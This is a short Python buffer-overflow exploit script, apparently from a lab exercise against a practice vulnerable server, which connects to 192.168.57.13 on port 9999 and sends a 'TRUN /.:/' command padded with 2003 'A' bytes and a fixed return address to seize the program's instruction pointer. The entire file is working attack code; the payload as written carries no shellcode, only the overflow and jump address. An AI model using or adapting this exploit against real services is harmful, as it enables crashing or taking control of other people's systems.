#!/usr/bin/python

import sys, socket

shellcode=b"A"*2003 + b"\xaf\x11\x50\x62"		

try:
    payload = b"TRUN /.:/" + shellcode
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.57.13',9999))
    s.send((payload))
    #s.send(("TRUN /.:/" + shellcode))
    s.close()
        
except:
    print("Error connecting to the server")
    sys.exit()	
